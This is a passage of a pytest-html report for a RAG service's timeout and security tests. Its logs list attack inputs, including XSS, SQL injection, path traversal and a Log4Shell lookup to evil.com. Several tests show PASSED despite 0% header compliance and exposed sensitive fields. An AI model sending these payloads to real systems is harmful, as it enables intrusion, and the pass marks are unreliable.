integration\nMetrics:\n  concurrent_requests_successful: 3\n  concurrent_requests_total: 3\n  concurrent_avg_response_time: 26.27\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:26:47,522 - TestRAGTimeout.test_concurrent_request_handling - INFO - Testing concurrent request handling\n2025-12-18 09:27:27,202 - TestRAGTimeout.test_concurrent_request_handling - INFO - \u2705 Concurrent requests: 3/3 successful\n2025-12-18 09:27:27,203 - TestRAGTimeout.test_concurrent_request_handling - INFO - Average response time: 26.27s\n\n------------------------------ Captured log call -------------------------------\nINFO     TestRAGTimeout.test_concurrent_request_handling:test_framework.py:390 Testing concurrent request handling\nINFO     TestRAGTimeout.test_concurrent_request_handling:test_framework.py:390 \u2705 Concurrent requests: 3/3 successful\nINFO     TestRAGTimeout.test_concurrent_request_handling:test_framework.py:390 Average response time: 26.27s\n\n&#34;}], &#34;tests/test_rag_timeout.py::TestRAGTimeout::test_error_recovery&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_timeout.py::TestRAGTimeout::test_error_recovery&#34;, &#34;duration&#34;: &#34;00:00:13&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_timeout.py::TestRAGTimeout::test_error_recovery&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:13&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_error_recovery - PASSED\nDuration: 13.44s\nCategory: integration\nMetrics:\n  error_recovery_success: True\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:27:27,205 - TestRAGTimeout.test_error_recovery - INFO - Testing error recovery\n2025-12-18 09:27:27,207 - TestRAGTimeout.test_error_recovery - INFO - \u2705 Invalid request handled gracefully\n2025-12-18 09:27:40,645 - TestRAGTimeout.test_error_recovery - INFO - \u2705 API recovered from invalid request\n\n------------------------------ Captured log call -------------------------------\nINFO     TestRAGTimeout.test_error_recovery:test_framework.py:390 Testing error recovery\nINFO     TestRAGTimeout.test_error_recovery:test_framework.py:390 \u2705 Invalid request handled gracefully\nINFO     TestRAGTimeout.test_error_recovery:test_framework.py:390 \u2705 API recovered from invalid request\n\n&#34;}], &#34;tests/test_rag_timeout.py::TestRAGTimeout::test_health_check_performance&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_timeout.py::TestRAGTimeout::test_health_check_performance&#34;, &#34;duration&#34;: &#34;4 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_timeout.py::TestRAGTimeout::test_health_check_performance&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;4 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_health_check_performance - PASSED\nDuration: 0.00s\nCategory: integration\nMetrics:\n  health_check_time: 0.00\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:27:40,648 - TestRAGTimeout.test_health_check_performance - INFO - Testing RAG API health check performance\n2025-12-18 09:27:40,649 - TestRAGTimeout.test_health_check_performance - INFO - \u2705 Health check responded in 0.00s\n\n------------------------------ Captured log call -------------------------------\nINFO     TestRAGTimeout.test_health_check_performance:test_framework.py:390 Testing RAG API health check performance\nINFO     TestRAGTimeout.test_health_check_performance:test_framework.py:390 \u2705 Health check responded in 0.00s\n\n&#34;}], &#34;tests/test_rag_timeout.py::TestRAGTimeout::test_rate_limiting_detection&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_timeout.py::TestRAGTimeout::test_rate_limiting_detection&#34;, &#34;duration&#34;: &#34;00:00:50&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_timeout.py::TestRAGTimeout::test_rate_limiting_detection&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:50&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_rate_limiting_detection - PASSED\nDuration: 50.01s\nCategory: integration\nMetrics:\n  rate_limiting_detected: True\n  rate_limited_count: 5\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:27:40,651 - TestRAGTimeout.test_rate_limiting_detection - INFO - Testing rate limiting detection\n2025-12-18 09:28:30,661 - TestRAGTimeout.test_rate_limiting_detection - INFO - \u26a0\ufe0f  Detected 5 rate limited requests\n\n------------------------------ Captured log call -------------------------------\nINFO     TestRAGTimeout.test_rate_limiting_detection:test_framework.py:390 Testing rate limiting detection\nINFO     TestRAGTimeout.test_rate_limiting_detection:test_framework.py:390 \u26a0\ufe0f  Detected 5 rate limited requests\n\n&#34;}], &#34;tests/test_rag_timeout.py::TestRAGTimeout::test_simple_query_performance&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_rag_timeout.py::TestRAGTimeout::test_simple_query_performance&#34;, &#34;duration&#34;: &#34;00:00:16&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_timeout.py::TestRAGTimeout::test_simple_query_performance&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:16&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/Users/4d/Documents/GitHub/Syntheverse/tests/test_rag_timeout.py&amp;#x27;, 52, &amp;quot;Skipped: RAG API not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=8000): Read timed out. (read timeout=5)&amp;quot;)\n&#34;}], &#34;tests/test_rag_timeout.py::TestRAGTimeout::test_timeout_handling&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_timeout.py::TestRAGTimeout::test_timeout_handling&#34;, &#34;duration&#34;: &#34;00:00:15&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_timeout.py::TestRAGTimeout::test_timeout_handling&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:15&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_timeout_handling - PASSED\nDuration: 14.71s\nCategory: integration\nMetrics:\n  complex_query_time: 14.14\n  complex_query_answer_length: 2662\n  complex_query_success: True\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:28:47,244 - TestRAGTimeout.test_timeout_handling - INFO - Testing timeout handling\n2025-12-18 09:29:01,387 - TestRAGTimeout.test_timeout_handling - INFO - \u2705 Complex query completed in 14.14s\n\n------------------------------ Captured log call -------------------------------\nINFO     TestRAGTimeout.test_timeout_handling:test_framework.py:390 Testing timeout handling\nINFO     TestRAGTimeout.test_timeout_handling:test_framework.py:390 \u2705 Complex query completed in 14.14s\n\n&#34;}], &#34;tests/test_security.py::TestSecurity::test_api_security_headers&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_security.py::TestSecurity::test_api_security_headers&#34;, &#34;duration&#34;: &#34;00:00:01&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_security.py::TestSecurity::test_api_security_headers&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:01&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_api_security_headers - PASSED\nDuration: 1.02s\nCategory: security\nMetrics:\n  security_header_compliance: 0.00\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:29:02,404 - TestSecurity.test_api_security_headers - INFO - Testing API security headers\n2025-12-18 09:29:02,406 - TestSecurity.test_api_security_headers - WARNING - \u26a0\ufe0f  poc_api: X-Content-Type-Options missing\n2025-12-18 09:29:02,407 - TestSecurity.test_api_security_headers - WARNING - \u26a0\ufe0f  poc_api: X-Frame-Options missing\n2025-12-18 09:29:02,407 - TestSecurity.test_api_security_headers - WARNING - \u26a0\ufe0f  poc_api: X-XSS-Protection missing\n2025-12-18 09:29:02,407 - TestSecurity.test_api_security_headers - WARNING - \u26a0\ufe0f  poc_api: Content-Security-Policy missing\n2025-12-18 09:29:02,407 - TestSecurity.test_api_security_headers - WARNING - \u26a0\ufe0f  poc_api: Strict-Transport-Security missing\n2025-12-18 09:29:02,408 - TestSecurity.test_api_security_headers - WARNING - \u26a0\ufe0f  rag_api: X-Content-Type-Options missing\n2025-12-18 09:29:02,408 - TestSecurity.test_api_security_headers - WARNING - \u26a0\ufe0f  rag_api: X-Frame-Options missing\n2025-12-18 09:29:02,408 - TestSecurity.test_api_security_headers - WARNING - \u26a0\ufe0f  rag_api: X-XSS-Protection missing\n2025-12-18 09:29:02,408 - TestSecurity.test_api_security_headers - WARNING - \u26a0\ufe0f  rag_api: Content-Security-Policy missing\n2025-12-18 09:29:02,408 - TestSecurity.test_api_security_headers - WARNING - \u26a0\ufe0f  rag_api: Strict-Transport-Security missing\n2025-12-18 09:29:02,408 - TestSecurity.test_api_security_headers - INFO - \u2705 Security headers: 0/10 present (0.0%)\n\n------------------------------ Captured log call -------------------------------\nINFO     TestSecurity.test_api_security_headers:test_framework.py:390 Testing API security headers\nWARNING  TestSecurity.test_api_security_headers:test_framework.py:400 \u26a0\ufe0f  poc_api: X-Content-Type-Options missing\nWARNING  TestSecurity.test_api_security_headers:test_framework.py:400 \u26a0\ufe0f  poc_api: X-Frame-Options missing\nWARNING  TestSecurity.test_api_security_headers:test_framework.py:400 \u26a0\ufe0f  poc_api: X-XSS-Protection missing\nWARNING  TestSecurity.test_api_security_headers:test_framework.py:400 \u26a0\ufe0f  poc_api: Content-Security-Policy missing\nWARNING  TestSecurity.test_api_security_headers:test_framework.py:400 \u26a0\ufe0f  poc_api: Strict-Transport-Security missing\nWARNING  TestSecurity.test_api_security_headers:test_framework.py:400 \u26a0\ufe0f  rag_api: X-Content-Type-Options missing\nWARNING  TestSecurity.test_api_security_headers:test_framework.py:400 \u26a0\ufe0f  rag_api: X-Frame-Options missing\nWARNING  TestSecurity.test_api_security_headers:test_framework.py:400 \u26a0\ufe0f  rag_api: X-XSS-Protection missing\nWARNING  TestSecurity.test_api_security_headers:test_framework.py:400 \u26a0\ufe0f  rag_api: Content-Security-Policy missing\nWARNING  TestSecurity.test_api_security_headers:test_framework.py:400 \u26a0\ufe0f  rag_api: Strict-Transport-Security missing\nINFO     TestSecurity.test_api_security_headers:test_framework.py:390 \u2705 Security headers: 0/10 present (0.0%)\n\n&#34;}], &#34;tests/test_security.py::TestSecurity::test_authentication_bypass_attempts&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_security.py::TestSecurity::test_authentication_bypass_attempts&#34;, &#34;duration&#34;: &#34;00:00:01&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_security.py::TestSecurity::test_authentication_bypass_attempts&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:01&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_authentication_bypass_attempts - PASSED\nDuration: 1.02s\nCategory: security\nMetrics:\n  bypass_prevention_rate: 100.00\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:29:03,425 - TestSecurity.test_authentication_bypass_attempts - INFO - Testing authentication bypass prevention\n2025-12-18 09:29:03,425 - TestSecurity.test_authentication_bypass_attempts - INFO - \u2705 Valid authentication works\n2025-12-18 09:29:03,425 - TestSecurity.test_authentication_bypass_attempts - INFO - \u2705 Invalid authentication properly rejected\n2025-12-18 09:29:03,425 - TestSecurity.test_authentication_bypass_attempts - INFO - \u2705 Bypass attempt blocked: admin...\n2025-12-18 09:29:03,425 - TestSecurity.test_authentication_bypass_attempts - INFO - \u2705 Bypass attempt blocked: ...\n2025-12-18 09:29:03,425 - TestSecurity.test_authentication_bypass_attempts - INFO - \u2705 Bypass attempt blocked: admin&amp;#x27;--...\n2025-12-18 09:29:03,425 - TestSecurity.test_authentication_bypass_attempts - INFO - \u2705 Bypass attempt blocked: admin...\n2025-12-18 09:29:03,425 - TestSecurity.test_authentication_bypass_attempts - INFO - \u2705 Bypass attempt blocked: &amp;lt;script&amp;gt;...\n2025-12-18 09:29:03,425 - TestSecurity.test_authentication_bypass_attempts - INFO - \u2705 Bypass attempt blocked: admin...\n2025-12-18 09:29:03,425 - TestSecurity.test_authentication_bypass_attempts - INFO - \u2705 Authentication bypass prevention: 6/6 attempts blocked (100.0%)\n\n------------------------------ Captured log call -------------------------------\nINFO     TestSecurity.test_authentication_bypass_attempts:test_framework.py:390 Testing authentication bypass prevention\nINFO     TestSecurity.test_authentication_bypass_attempts:test_framework.py:390 \u2705 Valid authentication works\nINFO     TestSecurity.test_authentication_bypass_attempts:test_framework.py:390 \u2705 Invalid authentication properly rejected\nINFO     TestSecurity.test_authentication_bypass_attempts:test_framework.py:390 \u2705 Bypass attempt blocked: admin...\nINFO     TestSecurity.test_authentication_bypass_attempts:test_framework.py:390 \u2705 Bypass attempt blocked: ...\nINFO     TestSecurity.test_authentication_bypass_attempts:test_framework.py:390 \u2705 Bypass attempt blocked: admin&amp;#x27;--...\nINFO     TestSecurity.test_authentication_bypass_attempts:test_framework.py:390 \u2705 Bypass attempt blocked: admin...\nINFO     TestSecurity.test_authentication_bypass_attempts:test_framework.py:390 \u2705 Bypass attempt blocked: &amp;lt;script&amp;gt;...\nINFO     TestSecurity.test_authentication_bypass_attempts:test_framework.py:390 \u2705 Bypass attempt blocked: admin...\nINFO     TestSecurity.test_authentication_bypass_attempts:test_framework.py:390 \u2705 Authentication bypass prevention: 6/6 attempts blocked (100.0%)\n\n&#34;}], &#34;tests/test_security.py::TestSecurity::test_data_exposure_prevention&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_security.py::TestSecurity::test_data_exposure_prevention&#34;, &#34;duration&#34;: &#34;00:00:01&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_security.py::TestSecurity::test_data_exposure_prevention&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:01&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_data_exposure_prevention - PASSED\nDuration: 1.01s\nCategory: security\nMetrics:\n  data_exposure_prevention_score: 0.00\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:29:04,439 - TestSecurity.test_data_exposure_prevention - INFO - Testing data exposure prevention\n2025-12-18 09:29:04,439 - TestSecurity.test_data_exposure_prevention - WARNING - \u26a0\ufe0f  Sensitive field exposed: password_hash\n2025-12-18 09:29:04,439 - TestSecurity.test_data_exposure_prevention - WARNING - \u26a0\ufe0f  Sensitive field exposed: credit_card\n2025-12-18 09:29:04,439 - TestSecurity.test_data_exposure_prevention - WARNING - \u26a0\ufe0f  Sensitive field exposed: ssn\n2025-12-18 09:29:04,439 - TestSecurity.test_data_exposure_prevention - WARNING - \u26a0\ufe0f  Sensitive field exposed: api_key\n2025-12-18 09:29:04,439 - TestSecurity.test_data_exposure_prevention - WARNING - \u26a0\ufe0f  Sensitive field exposed: private_notes\n2025-12-18 09:29:04,439 - TestSecurity.test_data_exposure_prevention - WARNING - \u26a0\ufe0f  Admin field not properly masked: password_hash\n2025-12-18 09:29:04,439 - TestSecurity.test_data_exposure_prevention - WARNING - \u26a0\ufe0f  Admin field not properly masked: credit_card\n2025-12-18 09:29:04,439 - TestSecurity.test_data_exposure_prevention - WARNING - \u26a0\ufe0f  Admin field not properly masked: ssn\n2025-12-18 09:29:04,439 - TestSecurity.test_data_exposure_prevention - WARNING - \u26a0\ufe0f  Admin field not properly masked: api_key\n2025-12-18 09:29:04,439 - TestSecurity.test_data_exposure_prevention - WARNING - \u26a0\ufe0f  Admin field not properly masked: private_notes\n2025-12-18 09:29:04,439 - TestSecurity.test_data_exposure_prevention - INFO - \u2705 Data exposure prevention: 0.0% effectiveness\n\n------------------------------ Captured log call -------------------------------\nINFO     TestSecurity.test_data_exposure_prevention:test_framework.py:390 Testing data exposure prevention\nWARNING  TestSecurity.test_data_exposure_prevention:test_framework.py:400 \u26a0\ufe0f  Sensitive field exposed: password_hash\nWARNING  TestSecurity.test_data_exposure_prevention:test_framework.py:400 \u26a0\ufe0f  Sensitive field exposed: credit_card\nWARNING  TestSecurity.test_data_exposure_prevention:test_framework.py:400 \u26a0\ufe0f  Sensitive field exposed: ssn\nWARNING  TestSecurity.test_data_exposure_prevention:test_framework.py:400 \u26a0\ufe0f  Sensitive field exposed: api_key\nWARNING  TestSecurity.test_data_exposure_prevention:test_framework.py:400 \u26a0\ufe0f  Sensitive field exposed: private_notes\nWARNING  TestSecurity.test_data_exposure_prevention:test_framework.py:400 \u26a0\ufe0f  Admin field not properly masked: password_hash\nWARNING  TestSecurity.test_data_exposure_prevention:test_framework.py:400 \u26a0\ufe0f  Admin field not properly masked: credit_card\nWARNING  TestSecurity.test_data_exposure_prevention:test_framework.py:400 \u26a0\ufe0f  Admin field not properly masked: ssn\nWARNING  TestSecurity.test_data_exposure_prevention:test_framework.py:400 \u26a0\ufe0f  Admin field not properly masked: api_key\nWARNING  TestSecurity.test_data_exposure_prevention:test_framework.py:400 \u26a0\ufe0f  Admin field not properly masked: private_notes\nINFO     TestSecurity.test_data_exposure_prevention:test_framework.py:390 \u2705 Data exposure prevention: 0.0% effectiveness\n\n&#34;}], &#34;tests/test_security.py::TestSecurity::test_data_integrity_validation&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_security.py::TestSecurity::test_data_integrity_validation&#34;, &#34;duration&#34;: &#34;00:00:01&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_security.py::TestSecurity::test_data_integrity_validation&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:01&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_data_integrity_validation - PASSED\nDuration: 1.01s\nCategory: security\nMetrics:\n  integrity_validation_working: True\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:29:05,453 - TestSecurity.test_data_integrity_validation - INFO - Testing data integrity validation\n2025-12-18 09:29:05,453 - TestSecurity.test_data_integrity_validation - INFO - \u2705 Original data integrity verified\n2025-12-18 09:29:05,453 - TestSecurity.test_data_integrity_validation - INFO - \u2705 Tampered data properly detected\n2025-12-18 09:29:05,453 - TestSecurity.test_data_integrity_validation - INFO - \u2705 Data integrity validation working\n\n------------------------------ Captured log call -------------------------------\nINFO     TestSecurity.test_data_integrity_validation:test_framework.py:390 Testing data integrity validation\nINFO     TestSecurity.test_data_integrity_validation:test_framework.py:390 \u2705 Original data integrity verified\nINFO     TestSecurity.test_data_integrity_validation:test_framework.py:390 \u2705 Tampered data properly detected\nINFO     TestSecurity.test_data_integrity_validation:test_framework.py:390 \u2705 Data integrity validation working\n\n&#34;}], &#34;tests/test_security.py::TestSecurity::test_file_upload_security&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_security.py::TestSecurity::test_file_upload_security&#34;, &#34;duration&#34;: &#34;00:00:01&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_security.py::TestSecurity::test_file_upload_security&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:01&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_file_upload_security - PASSED\nDuration: 1.02s\nCategory: security\nMetrics:\n  file_security_score: 100.00\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:29:06,470 - TestSecurity.test_file_upload_security - INFO - Testing file upload security\n2025-12-18 09:29:06,470 - TestSecurity.test_file_upload_security - INFO - \u2705 Dangerous extension blocked: .exe\n2025-12-18 09:29:06,470 - TestSecurity.test_file_upload_security - INFO - \u2705 Dangerous extension blocked: .bat\n2025-12-18 09:29:06,470 - TestSecurity.test_file_upload_security - INFO - \u2705 Dangerous extension blocked: .cmd\n2025-12-18 09:29:06,471 - TestSecurity.test_file_upload_security - INFO - \u2705 Dangerous extension blocked: .scr\n2025-12-18 09:29:06,471 - TestSecurity.test_file_upload_security - INFO - \u2705 Dangerous extension blocked: .pif\n2025-12-18 09:29:06,471 - TestSecurity.test_file_upload_security - INFO - \u2705 Safe extension allowed: .pdf\n2025-12-18 09:29:06,471 - TestSecurity.test_file_upload_security - INFO - \u2705 Safe extension allowed: .txt\n2025-12-18 09:29:06,471 - TestSecurity.test_file_upload_security - INFO - \u2705 Safe extension allowed: .md\n2025-12-18 09:29:06,471 - TestSecurity.test_file_upload_security - INFO - \u2705 Safe extension allowed: .json\n2025-12-18 09:29:06,471 - TestSecurity.test_file_upload_security - INFO - \u2705 Safe extension allowed: .xml\n2025-12-18 09:29:06,471 - TestSecurity.test_file_upload_security - INFO - \u2705 File upload security: 100.0% security score\n\n------------------------------ Captured log call -------------------------------\nINFO     TestSecurity.test_file_upload_security:test_framework.py:390 Testing file upload security\nINFO     TestSecurity.test_file_upload_security:test_framework.py:390 \u2705 Dangerous extension blocked: .exe\nINFO     TestSecurity.test_file_upload_security:test_framework.py:390 \u2705 Dangerous extension blocked: .bat\nINFO     TestSecurity.test_file_upload_security:test_framework.py:390 \u2705 Dangerous extension blocked: .cmd\nINFO     TestSecurity.test_file_upload_security:test_framework.py:390 \u2705 Dangerous extension blocked: .scr\nINFO     TestSecurity.test_file_upload_security:test_framework.py:390 \u2705 Dangerous extension blocked: .pif\nINFO     TestSecurity.test_file_upload_security:test_framework.py:390 \u2705 Safe extension allowed: .pdf\nINFO     TestSecurity.test_file_upload_security:test_framework.py:390 \u2705 Safe extension allowed: .txt\nINFO     TestSecurity.test_file_upload_security:test_framework.py:390 \u2705 Safe extension allowed: .md\nINFO     TestSecurity.test_file_upload_security:test_framework.py:390 \u2705 Safe extension allowed: .json\nINFO     TestSecurity.test_file_upload_security:test_framework.py:390 \u2705 Safe extension allowed: .xml\nINFO     TestSecurity.test_file_upload_security:test_framework.py:390 \u2705 File upload security: 100.0% security score\n\n&#34;}], &#34;tests/test_security.py::TestSecurity::test_input_sanitization&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_security.py::TestSecurity::test_input_sanitization&#34;, &#34;duration&#34;: &#34;00:00:01&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_security.py::TestSecurity::test_input_sanitization&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:01&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_input_sanitization - PASSED\nDuration: 1.02s\nCategory: security\nMetrics:\n  input_sanitization_rate: 100.00\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:29:07,488 - TestSecurity.test_input_sanitization - INFO - Testing input sanitization\n2025-12-18 09:29:07,489 - TestSecurity.test_input_sanitization - INFO - \u2705 Malicious input filtered: &amp;lt;script&amp;gt;alert(&amp;#x27;xss&amp;#x27;)&amp;lt;/script&amp;gt;...\n2025-12-18 09:29:07,489 - TestSecurity.test_input_sanitization - INFO - \u2705 Malicious input filtered: &amp;#x27;; DROP TABLE users; --...\n2025-12-18 09:29:07,489 - TestSecurity.test_input_sanitization - INFO - \u2705 Malicious input filtered: ../../../etc/passwd...\n2025-12-18 09:29:07,489 - TestSecurity.test_input_sanitization - INFO - \u2705 Malicious input filtered: &amp;lt;img src=x onerror=alert(&amp;#x27;xss&amp;#x27;...\n2025-12-18 09:29:07,489 - TestSecurity.test_input_sanitization - INFO - \u2705 Malicious input filtered: javascript:alert(&amp;#x27;xss&amp;#x27;)...\n2025-12-18 09:29:07,489 - TestSecurity.test_input_sanitization - INFO - \u2705 Malicious input filtered: ${jndi:ldap://evil.com/a}...\n2025-12-18 09:29:07,489 - TestSecurity.test_input_sanitization - INFO - \u2705 Malicious input filtered: {{7*7}}...\n2025-12-18 09:29:07,489 - TestSecurity.test_input_sanitization - INFO - \u2705 Malicious input filtered: eval(&amp;#x27;malicious code&amp;#x27;)...\n2025-12-18 09:29:07,489 - TestSecurity.test_input_sanitization - INFO - \u2705 Input sanitization: 8/8 malicious inputs filtered (100.0%)\n\n------------------------------ Captured log call -------------------------------\nINFO     TestSecurity.test_input_sanitization:test_framework.py:390 Testing input sanitization\nINFO     TestSecurity.test_input_sanitization:test_framework.py:390 \u2705 Malicious input filtered: &amp;lt;script&amp;gt;alert(&amp;#x27;xss&amp;#x27;)&amp;lt;/script&amp;gt;...\nINFO     TestSecurity.test_input_sanitization:test_framework.py:390 \u2705 Malicious input filtered: &amp;#x27;; DROP TABLE users; --...\nINFO     TestSecurity.test_input_sanitization:test_framework.py:390 \u2705 Malicious input filtered: ../../../etc/passwd...\nINFO     TestSecurity.test_input_sanitization:test_framework.py:390 \u2705 Malicious input filtered: &amp;lt;img src=x onerror=alert(&amp;#x27;xss&amp;#x27;...\nINFO     TestSecurity.test_input_sanitization:test_framework.py:390 \u2705 Malicious input filtered: javascript:alert(&amp;#x27;xss&amp;#x27;)...\nINFO     TestSecurity.test_input_sanitization:test_framework.py:390 \u2705 Malicious input filtered: ${jndi:ldap://evil.com/a}...\nINFO     TestSecurity.test_input_sanitization:test_framework.py:390 \u2705 Malicious input filtered: {{7*7}}...\nINFO     TestSecurity.test_input_sanitization:test_framework.py:390 \u2705 Malicious input filtered: eval(&amp;#x27;malicious code&amp;#x27;)...\nINFO     TestSecurity.test_input_sanitization:test_framework.py:390 \u2705 Input sanitization: 8/8 malicious inputs filtered (100.0%)\n\n&#34;}], &#34;tests/test_security.py::TestSecurity::test_rate_limiting_effectiveness&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_security.py::TestSecurity::test_rate_limiting_effectiveness&#34;, &#34;duration&#34;: &#34;00:00:01&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_security.py::TestSecurity::test_rate_limiting_effectiveness&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:01&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call 